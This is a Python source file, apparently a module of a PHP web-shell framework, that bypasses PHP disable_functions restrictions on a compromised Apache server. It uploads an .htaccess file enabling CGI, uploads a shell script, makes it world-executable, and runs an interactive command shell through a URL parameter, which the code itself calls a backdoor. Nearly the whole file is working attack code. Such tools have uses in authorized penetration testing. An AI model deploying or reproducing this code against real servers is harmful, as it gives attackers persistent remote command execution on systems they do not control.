from core.vectors import PhpCode, ShellCmd, ModuleExec, Os
from core.module import Module, Status
from core.loggers import log
from core import modules
from core import messages
from utils import strings
from utils import http
import string
import os

class Disablefunctionbypass(Module):

    """Bypass disable_function restrictions with mod_cgi and .htaccess."""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna',
                    # mod_cgi + .htaccess bypassing technique by ASDIZZLE
                    # https://blog.asdizzle.com/index.php/2016/05/02/getting-shell-access-with-php-system-functions-disabled/
                    'ASDIZZLE'                 ],
                'license': 'GPLv3'
            }
        )

        self.register_arguments([
            { 'name' : 'rpath', 'help' : 'Remote path. If it is a folder find the first writable folder in it', 'default' : '.', 'nargs' : '?' },
            { 'name' : '-script', 'help' : 'CGI script to upload', 'default' : os.path.join(self.folder, 'cgi.sh') },
            { 'name' : '-just-run', 'help' : 'Skip install and run shell through URL' },
        ])

        self.register_vectors( [
            PhpCode(
                """(is_callable('apache_get_modules')&&in_array('mod_cgi', apache_get_modules())&&print(1))||print(0);""",
                postprocess = lambda x: True if x == '1' else False,
                name = 'mod_cgi'
            ),
            ModuleExec(
                'file_upload2web', 
                [ '/bogus/.htaccess', '-content', 'Options +ExecCGI\nAddHandler cgi-script .${extension}' ],
                name = 'install_htaccess'
            ),
            ModuleExec(
                'file_upload', 
                [ '${script}', '${rpath}' ],
                name = 'install_script'
            ),
            PhpCode(
                """(is_callable('chmod')&&chmod('${rpath}', 0777)&&print(1))||print(0);""",
                postprocess = lambda x: True if x == '1' else False,
                name = 'chmod'
            ),
            ModuleExec(
                'file_rm', 
                [ '${path}' ],
                name = 'remove'
            ),
        ])

    def _clean(self, htaccess_absolute_path, script_absolute_path):

        log.warning('Deleting %s and %s' % (htaccess_absolute_path, script_absolute_path))
        self.vectors.get_result('remove', format_args = { 'path': htaccess_absolute_path })
        self.vectors.get_result('remove', format_args = { 'path': script_absolute_path })

    def _install(self):

        if not self.vectors.get_result('mod_cgi'):
            log.warning(messages.module_audit_disablefunctionbypass.error_mod_cgi_disabled)
            return

        filename = strings.randstr(5, charset = string.ascii_lowercase).decode('utf-8')
        ext = strings.randstr(3, charset = string.ascii_lowercase).decode('utf-8')

        result_install_htaccess = self.vectors.get_result(
            'install_htaccess', 
            format_args = { 'extension': ext }
        )
        if (
            not result_install_htaccess or 
            not result_install_htaccess[0][0] or 
            not result_install_htaccess[0][1]
            ):
            log.warning(messages.module_audit_disablefunctionbypass.error_installing_htaccess)
            return

        htaccess_absolute_path = result_install_htaccess[0][0]
        script_absolute_path = '%s.%s' % (htaccess_absolute_path.replace('.htaccess', filename), ext)
        script_url = '%s.%s' % (
            result_install_htaccess[0][1].replace('.htaccess', filename), 
            ext
        )

        result_install_script = self.vectors.get_result(
            'install_script',
            format_args = { 'script' : self.args.get('script'), 'rpath': script_absolute_path }
        )
        if not result_install_script:
            log.warning(messages.module_audit_disablefunctionbypass.error_uploading_script_to_s % script_absolute_path)
            self._clean(htaccess_absolute_path, script_absolute_path)
            return

        result_chmod = self.vectors.get_result(
            'chmod', 
            format_args = { 'rpath': script_absolute_path }
        )
        if not result_chmod:
            log.warning(messages.module_audit_disablefunctionbypass.error_changing_s_mode % script_absolute_path)
            self._clean(htaccess_absolute_path, script_absolute_path)
            return

        if not self._check_response(script_url):
            log.warning(messages.module_audit_disablefunctionbypass.error_s_unexpected_output % (script_url))
            self._clean(htaccess_absolute_path, script_absolute_path)
            return

        log.warning(messages.module_audit_disablefunctionbypass.cgi_installed_remove_s_s % (htaccess_absolute_path, script_absolute_path))
        log.warning(messages.module_audit_disablefunctionbypass.run_s_skip_reinstalling % (script_url))

        return script_url

    def _check_response(self, script_url):

        script_query = '%s?c=' % (script_url)
        query_random_str = strings.randstr(5).decode('utf-8')
        command_query = '%secho%%20%s' % (script_query, query_random_str)

        result_request = http.request(command_query).decode('utf-8')

        return query_random_str in result_request


    def run(self):

        # Terminate if shell_sh is active
        if self.session['shell_sh']['status'] == Status.RUN:
            log.warning(messages.module_audit_disablefunctionbypass.error_sh_commands_enabled)
            return

        # Install if -just-run option hasn't been provided, else directly check the backdoor
        script_url = self.args.get('just_run')
        if not script_url:
            script_url = self._install()
            if not script_url:
                return
        elif not self._check_response(script_url):
                log.warning(messages.module_audit_disablefunctionbypass.error_s_unexpected_output % (script_url))
                return

        log.warning(messages.module_audit_disablefunctionbypass.requests_not_obfuscated)

        # Console loop
        while True:

            query = input('CGI shell replacement $ ').strip().replace(' ', '%20')

            if not query:
                continue
            if query == 'quit':
                break

            log.info(http.request('%s?c=%s' % (script_url, query)).decode())
